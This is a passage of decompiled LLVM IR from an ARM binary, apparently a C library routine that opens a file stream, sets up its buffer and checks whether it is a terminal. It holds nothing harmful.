  store i32 68, i32* %r0.global-to-local, align 4
  %v1_1f658 = call i32 @malloc(i32 68)
  store i32 %v1_1f658, i32* %r0.global-to-local, align 4
  store i32 %v1_1f658, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1f65c = icmp eq i32 %v1_1f658, 0
  br i1 %v3_1f65c, label %dec_label_pc_1f9d0, label %dec_label_pc_1f664

dec_label_pc_1f664:                               ; preds = %dec_label_pc_1f654
  %v0_1f668 = load i32, i32* @r8, align 4
  %v2_1f668 = add i32 %v0_1f668, -34468
  store i32 %v2_1f668, i32* %r3.global-to-local, align 4
  %v1_1f66c = inttoptr i32 %v2_1f668 to i32*
  %v2_1f66c = load i32, i32* %v1_1f66c, align 4
  store i32 %v2_1f66c, i32* %r0.global-to-local, align 4
  %v3_1f66c = add i32 %v0_1f668, -34464
  %v4_1f66c = inttoptr i32 %v3_1f66c to i32*
  %v5_1f66c = load i32, i32* %v4_1f66c, align 4
  store i32 %v5_1f66c, i32* @r1, align 4
  %v6_1f66c = add i32 %v0_1f668, -34460
  %v7_1f66c = inttoptr i32 %v6_1f66c to i32*
  %v8_1f66c = load i32, i32* %v7_1f66c, align 4
  store i32 %v8_1f66c, i32* %r2.global-to-local, align 4
  %v2_1f678 = add i32 %v1_1f658, 8
  %v3_1f678 = inttoptr i32 %v2_1f678 to i32*
  store i32 0, i32* %v3_1f678, align 4
  %v2_1f680 = load i32, i32* @r5, align 4
  %v3_1f680 = inttoptr i32 %v2_1f680 to i16*
  store i16 8192, i16* %v3_1f680, align 2
  %v2_1f684 = load i32, i32* %r0.global-to-local, align 4
  %v0_1f688 = load i32, i32* @r5, align 4
  %v1_1f688 = add i32 %v0_1f688, 56
  store i32 %v1_1f688, i32* @r3, align 4
  %v1_1f68c = inttoptr i32 %v1_1f688 to i32*
  store i32 %v2_1f684, i32* %v1_1f68c, align 4
  %v3_1f68c = add i32 %v0_1f688, 60
  %v4_1f68c = inttoptr i32 %v3_1f68c to i32*
  %v5_1f68c = load i32, i32* @r1, align 4
  store i32 %v5_1f68c, i32* %v4_1f68c, align 4
  %v6_1f68c = add i32 %v0_1f688, 64
  %v7_1f68c = inttoptr i32 %v6_1f68c to i32*
  %v8_1f68c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1f68c, i32* %v7_1f68c, align 4
  %v0_1f690.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1f690

dec_label_pc_1f690:                               ; preds = %.thread3, %dec_label_pc_1f664
  %v0_1f6e8 = phi i32 [ %v0_1f5d4, %.thread3 ], [ %v0_1f690.pre, %dec_label_pc_1f664 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1f690 = icmp slt i32 %v0_1f6e8, 0
  br i1 %v1_1f690, label %dec_label_pc_1f6e8, label %dec_label_pc_1f698

dec_label_pc_1f698:                               ; preds = %dec_label_pc_1f690
  %v0_1f69c = load i32, i32* @r4, align 4
  %v2_1f69c = and i32 %v0_1f69c, 131075
  %v1_1f6a0 = add nuw nsw i32 %v2_1f69c, 1
  store i32 %v1_1f6a0, i32* %r2.global-to-local, align 4
  %v0_1f6a4 = load i32, i32* @r7, align 4
  %v1_1f6a4 = add i32 %v0_1f6a4, 1
  %v2_1f6a8 = and i32 %v1_1f6a4, %v1_1f6a0
  store i32 %v2_1f6a8, i32* %r3.global-to-local, align 4
  %v3_1f6ac = icmp uge i32 %v2_1f6a8, %v1_1f6a0
  store i1 %v3_1f6ac, i1* %cpsr_c.global-to-local, align 1
  %v9_1f6ac = icmp eq i32 %v2_1f6a8, %v1_1f6a0
  %v1_1f6b0 = load i32, i32* @r5, align 4
  %v2_1f6b0 = add i32 %v1_1f6b0, 4
  %v3_1f6b0 = inttoptr i32 %v2_1f6b0 to i32*
  store i32 %v0_1f6e8, i32* %v3_1f6b0, align 4
  br i1 %v9_1f6ac, label %dec_label_pc_1f6b8, label %dec_label_pc_1f5f4

dec_label_pc_1f6b8:                               ; preds = %dec_label_pc_1f698
  %v0_1f6b8 = load i32, i32* @r4, align 4
  %v1_1f6b8 = load i32, i32* @r7, align 4
  %v2_1f6b8 = sub i32 -1, %v1_1f6b8
  %v3_1f6b8 = and i32 %v0_1f6b8, %v2_1f6b8
  store i32 %v3_1f6b8, i32* @r3, align 4
  %v1_1f6bc = and i32 %v3_1f6b8, 1024
  %v2_1f6bc = icmp eq i32 %v1_1f6bc, 0
  br i1 %v2_1f6bc, label %dec_label_pc_1f6dc, label %dec_label_pc_1f6c4

dec_label_pc_1f6c4:                               ; preds = %dec_label_pc_1f6b8
  %v0_1f6c4 = load i32, i32* @r6, align 4
  store i32 %v0_1f6c4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_1f6d0 = call i32 @__libc_fcntl(i32 %v0_1f6c4, i32 4)
  store i32 %v2_1f6d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f6d4 = icmp eq i32 %v2_1f6d0, 0
  br i1 %v2_1f6d4, label %dec_label_pc_1f6c4.dec_label_pc_1f6dc_crit_edge, label %dec_label_pc_1f5f4

dec_label_pc_1f6c4.dec_label_pc_1f6dc_crit_edge:  ; preds = %dec_label_pc_1f6c4
  %v0_1f6dc.pre = load i32, i32* @r7, align 4
  %v0_1f6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1f6dc

dec_label_pc_1f6dc:                               ; preds = %dec_label_pc_1f6c4.dec_label_pc_1f6dc_crit_edge, %dec_label_pc_1f6b8
  %v0_1f6e0 = phi i32 [ %v0_1f6e0.pre, %dec_label_pc_1f6c4.dec_label_pc_1f6dc_crit_edge ], [ %v0_1f6b8, %dec_label_pc_1f6b8 ]
  %v0_1f6dc = phi i32 [ %v0_1f6dc.pre, %dec_label_pc_1f6c4.dec_label_pc_1f6dc_crit_edge ], [ %v1_1f6b8, %dec_label_pc_1f6b8 ]
  %v1_1f6dc = and i32 %v0_1f6dc, 131072
  store i32 %v1_1f6dc, i32* %r3.global-to-local, align 4
  %v2_1f6e0 = or i32 %v1_1f6dc, %v0_1f6e0
  store i32 %v2_1f6e0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1f70c

dec_label_pc_1f6e8:                               ; preds = %dec_label_pc_1f690
  %v2_1f6e8 = icmp eq i32 %v0_1f6e8, -1
  store i1 %v2_1f6e8, i1* %cpsr_c.global-to-local, align 1
  %v7_1f6e8 = icmp eq i32 %v0_1f6e8, -1
  %v0_1f6f4.pre = load i32, i32* @r4, align 4
  br i1 %v7_1f6e8, label %dec_label_pc_1f6e8._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_1f6e8
  %v2_1f6ec = or i32 %v0_1f6f4.pre, 131072
  store i32 %v2_1f6ec, i32* @r4, align 4
  br label %dec_label_pc_1f6e8._crit_edge

dec_label_pc_1f6e8._crit_edge:                    ; preds = %dec_label_pc_1f6e8, %bb53
  %v0_1f6f4 = phi i32 [ %v2_1f6ec, %bb53 ], [ %v0_1f6f4.pre, %dec_label_pc_1f6e8 ]
  %v0_1f6f0 = load i32, i32* @r7, align 4
  store i32 %v0_1f6f0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1f6fc = call i32 @__libc_open(i32 %v0_1f6f0, i32 %v0_1f6f4)
  store i32 %v2_1f6fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1f700 = icmp slt i32 %v2_1f6fc, 0
  %v1_1f704 = load i32, i32* @r5, align 4
  %v2_1f704 = add i32 %v1_1f704, 4
  %v3_1f704 = inttoptr i32 %v2_1f704 to i32*
  store i32 %v2_1f6fc, i32* %v3_1f704, align 4
  br i1 %v1_1f700, label %dec_label_pc_1f610, label %.dec_label_pc_1f70c_crit_edge

.dec_label_pc_1f70c_crit_edge:                    ; preds = %dec_label_pc_1f6e8._crit_edge
  %v0_1f710.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1f70c

dec_label_pc_1f70c:                               ; preds = %.dec_label_pc_1f70c_crit_edge, %dec_label_pc_1f6dc
  %v0_1f728 = phi i32 [ %v0_1f710.pre, %.dec_label_pc_1f70c_crit_edge ], [ %v2_1f6e0, %dec_label_pc_1f6dc ]
  %v0_1f70c = load i32, i32* @r5, align 4
  %v1_1f70c = inttoptr i32 %v0_1f70c to i16*
  %v2_1f70c = load i16, i16* %v1_1f70c, align 2
  %v3_1f70c = zext i16 %v2_1f70c to i32
  %v1_1f710 = urem i32 %v0_1f728, 4
  %v1_1f714 = and i32 %v0_1f728, 1024
  %v1_1f718 = and i32 %v3_1f70c, 8192
  %v1_1f71c = add nuw nsw i32 %v1_1f710, 1
  %v2_1f720 = or i32 %v1_1f718, %v1_1f714
  store i32 %v2_1f720, i32* %r3.global-to-local, align 4
  %v1_1f724 = xor i32 %v1_1f71c, 3
  %v1_1f728 = and i32 %v0_1f728, 131072
  store i32 %v1_1f728, i32* %r2.global-to-local, align 4
  %v2_1f728 = icmp eq i32 %v1_1f728, 0
  %v1_1f72c = add i32 %v0_1f70c, 4
  %v2_1f72c = inttoptr i32 %v1_1f72c to i32*
  %v3_1f72c = load i32, i32* %v2_1f72c, align 4
  store i32 %v3_1f72c, i32* @r4, align 4
  br i1 %v2_1f728, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1f70c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1f70c, %bb54
  %v0_1f738 = phi i32 [ 0, %dec_label_pc_1f70c ], [ 32768, %bb54 ]
  %v4_1f734 = mul nuw nsw i32 %v1_1f724, 16
  %v5_1f734 = or i32 %v2_1f720, %v4_1f734
  store i32 %v5_1f734, i32* %r3.global-to-local, align 4
  %v2_1f738 = or i32 %v0_1f738, %v5_1f734
  store i32 %v2_1f738, i32* %r2.global-to-local, align 4
  %v2_1f73c = icmp ugt i32 %v3_1f72c, 2147483646
  store i1 %v2_1f73c, i1* %cpsr_c.global-to-local, align 1
  %v8_1f73c = icmp eq i32 %v3_1f72c, 2147483647
  %v1_1f740 = trunc i32 %v2_1f738 to i16
  store i16 %v1_1f740, i16* %v1_1f70c, align 2
  br i1 %v8_1f73c, label %dec_label_pc_1f780, label %dec_label_pc_1f748

dec_label_pc_1f748:                               ; preds = %bb55
  store i32 51472, i32* %r3.global-to-local, align 4
  %v0_1f74c = call i32 @__aeabi_read_tp()
  %v3_1f750 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1f750 = sext i16 %v3_1f750 to i32
  store i32 %v4_1f750, i32* @r3, align 4
  store i32 %v0_1f74c, i32* @r6, align 4
  %v0_1f758 = load i32, i32* @r4, align 4
  store i32 %v0_1f758, i32* @r0, align 4
  %v2_1f75c = add i32 %v4_1f750, %v0_1f74c
  %v3_1f75c = inttoptr i32 %v2_1f75c to i32*
  %v4_1f75c = load i32, i32* %v3_1f75c, align 4
  store i32 %v4_1f75c, i32* @r4, align 4
  %v1_1f760 = call i32 @isatty(i32 %v0_1f758)
  store i32 %v1_1f760, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f764 = icmp eq i32 %v1_1f760, 0
  br i1 %v2_1f764, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_1f748
  %v1_1f768 = load i32, i32* @r5, align 4
  %v2_1f768 = inttoptr i32 %v1_1f768 to i16*
  %v3_1f768 = load i16, i16* %v2_1f768, align 2
  %v4_1f768 = zext i16 %v3_1f768 to i32
  %v2_1f76c = or i32 %v4_1f768, 256
  store i32 %v2_1f76c, i32* %r3.global-to-local, align 4
  %v2_1f770 = trunc i32 %v2_1f76c to i16
  store i16 %v2_1f770, i16* %v2_1f768, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1f748, %bb56
  %v3_1f778 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1f778 = sext i16 %v3_1f778 to i32
  store i32 %v4_1f778, i32* %r3.global-to-local, align 4
  %v0_1f77c = load i32, i32* @r4, align 4
  %v1_1f77c = load i32, i32* @r6, align 4
  %v3_1f77c = add i32 %v1_1f77c, %v4_1f778
  %v4_1f77c = inttoptr i32 %v3_1f77c to i32*
  store i32 %v0_1f77c, i32* %v4_1f77c, align 4
  br label %dec_label_pc_1f780

dec_label_pc_1f780:                               ; preds = %bb55, %.thread5
  %v0_1f780 = load i32, i32* @r5, align 4
  %v1_1f780 = add i32 %v0_1f780, 8
  %v2_1f780 = inttoptr i32 %v1_1f780 to i32*
  %v3_1f780 = load i32, i32* %v2_1f780, align 4
  store i32 %v3_1f780, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f784 = icmp eq i32 %v3_1f780, 0
  br i1 %v2_1f784, label %dec_label_pc_1f78c, label %bb57

dec_label_pc_1f78c:                               ; preds = %dec_label_pc_1f780
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_1f790 = call i32 @malloc(i32 4096)
  store i32 %v1_1f790, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f794 = icmp eq i32 %v1_1f790, 0
  %v1_1f7a4.pre = load i32, i32* @r5, align 4
  br i1 %v2_1f794, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1f78c
  %v2_1f798 = inttoptr i32 %v1_1f7a4.pre to i16*
  %v3_1f798 = load i16, i16* %v2_1f798, align 2
  %v4_1f798 = zext i16 %v3_1f798 to i32
  %v2_1f79c = add i32 %v1_1f790, 4096
  store i32 %v2_1f79c, i32* %r2.global-to-local, align 4
  %v2_1f7a0 = or i32 %v4_1f798, 16384
  store i32 %v2_1f7a0, i32* %r3.global-to-local, align 4
  %v2_1f7a4 = add i32 %v1_1f7a4.pre, 8
  %v3_1f7a4 = inttoptr i32 %v2_1f7a4 to i32*
  store i32 %v1_1f790, i32* %v3_1f7a4, align 4
  %v1_1f7a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1f7a8 = load i32, i32* @r5, align 4
  %v3_1f7a8 = add i32 %v2_1f7a8, 12
  %v4_1f7a8 = inttoptr i32 %v3_1f7a8 to i32*
  store i32 %v1_1f7a8, i32* %v4_1f7a8, align 4
  %v1_1f7ac = load i32, i32* %r3.global-to-local, align 4
  %v2_1f7ac = trunc i32 %v1_1f7ac to i16
  %v3_1f7ac = load i32, i32* @r5, align 4
  %v4_1f7ac = inttoptr i32 %v3_1f7ac to i16*
  store i16 %v2_1f7ac, i16* %v4_1f7ac, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1f78c
  %v2_1f7a437 = add i32 %v1_1f7a4.pre, 8
  %v3_1f7a438 = inttoptr i32 %v2_1f7a437 to i32*
  store i32 0, i32* %v3_1f7a438, align 4
  %v2_1f7b0 = load i32, i32* @r5, align 4
  %v3_1f7b0 = add i32 %v2_1f7b0, 12
  %v4_1f7b0 = inttoptr i32 %v3_1f7b0 to i32*
  store i32 0, i32* %v4_1f7b0, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_1f780, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1f7bc = load i32, i32* @r8, align 4
  %v2_1f7bc = add i32 %v0_1f7bc, 92
  %v3_1f7bc = inttoptr i32 %v2_1f7bc to i32*
  %v4_1f7bc = load i32, i32* %v3_1f7bc, align 4
  store i32 %v4_1f7bc, i32* %r3.global-to-local, align 4
  %v2_1f7c0 = load i32, i32* @r5, align 4
  %v3_1f7c0 = add i32 %v2_1f7c0, 2
  %v4_1f7c0 = inttoptr i32 %v3_1f7c0 to i8*
  store i8 0, i8* %v4_1f7c0, align 1
  %v0_1f7c4 = load i32, i32* @r5, align 4
  %v1_1f7c4 = inttoptr i32 %v0_1f7c4 to i16*
  %v2_1f7c4 = load i16, i16* %v1_1f7c4, align 2
  %v3_1f7c4 = zext i16 %v2_1f7c4 to i32
  store i32 %v3_1f7c4, i32* %r2.global-to-local, align 4
  %v0_1f7c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f7c8 = inttoptr i32 %v0_1f7c8 to i32*
  %v2_1f7c8 = load i32, i32* %v1_1f7c8, align 4
  store i32 %v2_1f7c8, i32* @r1, align 4
  %v1_1f7cc = add i32 %v0_1f7c4, 8
  %v2_1f7cc = inttoptr i32 %v1_1f7cc to i32*
  %v3_1f7cc = load i32, i32* %v2_1f7cc, align 4
  store i32 %v3_1f7cc, i32* %r3.global-to-local, align 4
  %v1_1f7d0 = and i32 %v3_1f7c4, 8192
  %v2_1f7d0 = icmp eq i32 %v1_1f7d0, 0
  %v2_1f7d4 = add i32 %v0_1f7c4, 20
  %v3_1f7d4 = inttoptr i32 %v2_1f7d4 to i32*
  store i32 %v3_1f7cc, i32* %v3_1f7d4, align 4
  %v0_1f7d8 = load i32, i32* @r1, align 4
  %v1_1f7d8 = load i32, i32* @r5, align 4
  %v2_1f7d8 = add i32 %v1_1f7d8, 52
  %v3_1f7d8 = inttoptr i32 %v2_1f7d8 to i32*
  store i32 %v0_1f7d8, i32* %v3_1f7d8, align 4
  %v0_1f7dc = load i32, i32* %r3.global-to-local, align 4
  %v1_1f7dc = load i32, i32* @r5, align 4
  %v2_1f7dc = add i32 %v1_1f7dc, 24
  %v3_1f7dc = inttoptr i32 %v2_1f7dc to i32*
  store i32 %v0_1f7dc, i32* %v3_1f7dc, align 4
  %v0_1f7e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f7e0 = load i32, i32* @r5, align 4
  %v2_1f7e0 = add i32 %v1_1f7e0, 28
  %v3_1f7e0 = inttoptr i32 %v2_1f7e0 to i32*
  store i32 %v0_1f7e0, i32* %v3_1f7e0, align 4
  %v0_1f7e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f7e4 = load i32, i32* @r5, align 4
  %v2_1f7e4 = add i32 %v1_1f7e4, 16
  %v3_1f7e4 = inttoptr i32 %v2_1f7e4 to i32*
  store i32 %v0_1f7e4, i32* %v3_1f7e4, align 4
  %v0_1f7e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1f7e8 = load i32, i32* @r5, align 4
  %v2_1f7e8 = add i32 %v1_1f7e8, 44
  %v3_1f7e8 = inttoptr i32 %v2_1f7e8 to i32*
  store i32 %v0_1f7e8, i32* %v3_1f7e8, align 4
  br i1 %v2_1f7d0, label %dec_label_pc_1f9d0, label %dec_label_pc_1f7f0

dec_label_pc_1f7f0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1f7f4 = load i32, i32* @r8, align 4
  %v2_1f7f4 = add i32 %v0_1f7f4, 160
  %v3_1f7f4 = inttoptr i32 %v2_1f7f4 to i32*
  %v4_1f7f4 = load i32, i32* %v3_1f7f4, align 4
  store i32 %v4_1f7f4, i32* %r7.global-to-local, align 4
  %v0_1f7f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f7f8, i32* %r0.global-to-local, align 4
  %v1_1f7fc = add i32 %v4_1f7f4, 8
  %v2_1f7fc = inttoptr i32 %v1_1f7fc to i32*
  %v3_1f7fc = load i32, i32* %v2_1f7fc, align 4
  store i32 %v3_1f7fc, i32* %r3.global-to-local, align 4
  %v1_1f800 = add i32 %v0_1f7f8, -1168
  store i32 %v1_1f800, i32* %r6.global-to-local, align 4
  %v3_1f804 = icmp uge i32 %v3_1f7fc, %v1_1f800
  store i1 %v3_1f804, i1* %cpsr_c.global-to-local, align 1
  %v9_1f804 = icmp eq i32 %v3_1f7fc, %v1_1f800
  br i1 %v9_1f804, label %dec_label_pc_1f848, label %dec_label_pc_1f80c

dec_label_pc_1f80c:                               ; preds = %dec_label_pc_1f7f0
  store i32 %v4_1f7f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f814

dec_label_pc_1f814:                               ; preds = %dec_label_pc_1f820.dec_label_pc_1f814_crit_edge, %dec_label_pc_1f80c
  %v0_1f814 = phi i32 [ %v0_1f814.pre, %dec_label_pc_1f820.dec_label_pc_1f814_crit_edge ], [ %v4_1f7f4, %dec_label_pc_1f80c ]
  %v1_1f814 = inttoptr i32 %v0_1f814 to i32*
  %v2_1f814 = load i32, i32* %v1_1f814, align 4
  store i32 %v2_1f814, i32* %r3.global-to-local, align 4
  %v1_1f818 = load i32, i32* %r4.global-to-local, align 4
  %v3_1f818 = icmp uge i32 %v2_1f814, %v1_1f818
  store i1 %v3_1f818, i1* %cpsr_c.global-to-local, align 1
  %v9_1f818 = icmp eq i32 %v2_1f814, %v1_1f818
  br i1 %v9_1f818, label %dec_label_pc_1f820, label %dec_label_pc_1f838

dec_label_pc_1f820:                               ; preds = %dec_label_pc_1f814
  store i32 %v2_1f814, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f830 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f830, label %dec_label_pc_1f834, label %dec_label_pc_1f820.dec_label_pc_1f814_crit_edge

dec_label_pc_1f820.dec_label_pc_1f814_crit_edge:  ; preds = %dec_label_pc_1f820
  %v0_1f814.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f814

dec_label_pc_1f834:                               ; preds = %dec_label_pc_1f820
  %v0_1f834 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1f834, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f838

dec_label_pc_1f838:                               ; preds = %dec_label_pc_1f814, %dec_label_pc_1f834
  %v0_1f838 = phi i32 [ %v0_1f834, %dec_label_pc_1f834 ], [ %v2_1f814, %dec_label_pc_1f814 ]
  %v1_1f838 = phi i32 [ %v0_1f834, %dec_label_pc_1f834 ], [ %v1_1f818, %dec_label_pc_1f814 ]
  %v3_1f838 = icmp uge i32 %v0_1f838, %v1_1f838
  store i1 %v3_1f838, i1* %cpsr_c.global-to-local, align 1
  %v9_1f838 = icmp eq i32 %v0_1f838, %v1_1f838
  br i1 %v9_1f838, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_1f838
  %v1_1f83c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1f83c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_1f838, %bb58
  %v1_1f840 = xor i1 %v9_1f838, true
  call void @__pseudo_cond_branch(i1 %v1_1f840, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1f844 = load i32, i32* %r6.global-to-local, align 4
  %v1_1f844 = load i32, i32* %r7.global-to-local, align 4
  %v2_1f844 = add i32 %v1_1f844, 8
  %v3_1f844 = inttoptr i32 %v2_1f844 to i32*
  store i32 %v0_1f844, i32* %v3_1f844, align 4
  %v1_1f864.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1f848

dec_label_pc_1f848:                               ; preds = %dec_label_pc_1f7f0, %bb59
  %v1_1f864 = phi i32 [ %v3_1f7fc, %dec_label_pc_1f7f0 ], [ %v1_1f864.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1f84c = load i32, i32* @r8, align 4
  %v2_1f84c = add i32 %v0_1f84c, 160
  %v3_1f84c = inttoptr i32 %v2_1f84c to i32*
  %v4_1f84c = load i32, i32* %v3_1f84c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1f854 = add i32 %v0_1f84c, 152
  %v3_1f854 = inttoptr i32 %v2_1f854 to i32*
  %v4_1f854 = load i32, i32* %v3_1f854, align 4
  store i32 %v4_1f854, i32* %r7.global-to-local, align 4
  %v1_1f858 = add i32 %v4_1f84c, 4
  %v2_1f858 = inttoptr i32 %v1_1f858 to i32*
  %v3_1f858 = load i32, i32* %v2_1f858, align 4
  store i32 %v3_1f858, i32* %r3.global-to-local, align 4
  %v1_1f85c = add i32 %v4_1f854, 8
  %v2_1f85c = inttoptr i32 %v1_1f85c to i32*
  %v3_1f85c = load i32, i32* %v2_1f85c, align 4
  store i32 %v3_1f85c, i32* %r2.global-to-local, align 4
  %v1_1f860 = add i32 %v3_1f858, 1
  store i32 %v1_1f860, i32* %r3.global-to-local, align 4
  %v3_1f864 = icmp uge i32 %v3_1f85c, %v1_1f864
  store i1 %v3_1f864, i1* %cpsr_c.global-to-local, align 1
  %v9_1f864 = icmp eq i32 %v3_1f85c, %v1_1f864
  store i32 %v1_1f860, i32* %v2_1f858, align 4
  br i1 %v9_1f864, label %dec_label_pc_1f8b0, label %dec_label_pc_1f870

dec_label_pc_1f870:                               ; preds = %dec_label_pc_1f848
  %v0_1f874 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1f874, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1f87c95 = inttoptr i32 %v0_1f874 to i32*
  %v2_1f87c96 = load i32, i32* %v1_1f87c95, align 4
  store i32 %v2_1f87c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1f88098 = icmp eq i32 %v2_1f87c96, 0
  br i1 %v9_1f88098, label %dec_label_pc_1f888, label %dec_label_pc_1f8a0

dec_label_pc_1f888:                               ; preds = %dec_label_pc_1f870, %dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge
  %v0_1f88899 = phi i32 [ %v1_1f880.pre, %dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge ], [ 0, %dec_label_pc_1f870 ]
  store i32 %v0_1f88899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f898 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f898, label %dec_label_pc_1f89c, label %dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge

dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge:  ; preds = %dec_label_pc_1f888
  %v0_1f87c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f880.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1f87c = inttoptr i32 %v0_1f87c.pre to i32*
  %v2_1f87c = load i32, i32* %v1_1f87c, align 4
  store i32 %v2_1f87c, i32* %r3.global-to-local, align 4
  %v3_1f880 = icmp uge i32 %v2_1f87c, %v1_1f880.pre
  store i1 %v3_1f880, i1* %cpsr_c.global-to-local, align 1
  %v9_1f880 = icmp eq i32 %v2_1f87c, %v1_1f880.pre
  br i1 %v9_1f880, label %dec_label_pc_1f888, label %dec_label_pc_1f8a0

dec_label_pc_1f89c:                               ; preds = %dec_label_pc_1f888
  %v0_1f89c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1f89c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f8a0

dec_label_pc_1f8a0:                               ; preds = %dec_label_pc_1f870, %dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge, %dec_label_pc_1f89c
  %v0_1f8a0 = phi i32 [ %v0_1f89c, %dec_label_pc_1f89c ], [ %v2_1f87c96, %dec_label_pc_1f870 ], [ %v2_1f87c, %dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge ]
  %v1_1f8a0 = phi i32 [ %v0_1f89c, %dec_label_pc_1f89c ], [ 0, %dec_label_pc_1f870 ], [ %v1_1f880.pre, %dec_label_pc_1f888.dec_label_pc_1f87c_crit_edge ]
  %v3_1f8a0 = icmp uge i32 %v0_1f8a0, %v1_1f8a0
  store i1 %v3_1f8a0, i1* %cpsr_c.global-to-local, align 1
  %v9_1f8a0 = icmp eq i32 %v0_1f8a0, %v1_1f8a0
  br i1 %v9_1f8a0, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_1f8a0
  %v1_1f8a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1f8a4, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_1f8a0, %bb60
  %v1_1f8a8 = xor i1 %v9_1f8a0, true
  call void @__pseudo_cond_branch(i1 %v1_1f8a8, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1f8ac = load i32, i32* %r6.global-to-local, align 4
  %v1_1f8ac = load i32, i32* %r7.global-to-local, align 4
  %v2_1f8ac = add i32 %v1_1f8ac, 8
  %v3_1f8ac = inttoptr i32 %v2_1f8ac to i32*
  store i32 %v0_1f8ac, i32* %v3_1f8ac, align 4
  br label %dec_label_pc_1f8b0

dec_label_pc_1f8b0:                               ; preds = %dec_label_pc_1f848, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1f8b4 = load i32, i32* @r8, align 4
  %v2_1f8b4 = add i32 %v0_1f8b4, 152
  %v3_1f8b4 = inttoptr i32 %v2_1f8b4 to i32*
  %v4_1f8b4 = load i32, i32* %v3_1f8b4, align 4
  store i32 %v4_1f8b4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1f8bc = add i32 %v0_1f8b4, 76
  %v3_1f8bc = inttoptr i32 %v2_1f8bc to i32*
  %v4_1f8bc = load i32, i32* %v3_1f8bc, align 4
  store i32 %v4_1f8bc, i32* @r1, align 4
  %v1_1f8c0 = add i32 %v4_1f8b4, 4
  %v2_1f8c0 = inttoptr i32 %v1_1f8c0 to i32*
  %v3_1f8c0 = load i32, i32* %v2_1f8c0, align 4
  store i32 %v3_1f8c0, i32* %r3.global-to-local, align 4
  %v1_1f8c4 = inttoptr i32 %v4_1f8bc to i32*
  %v2_1f8c4 = load i32, i32* %v1_1f8c4, align 4
  store i32 %v2_1f8c4, i32* %r2.global-to-local, align 4
  %v1_1f8c8 = add i32 %v3_1f8c0, 1
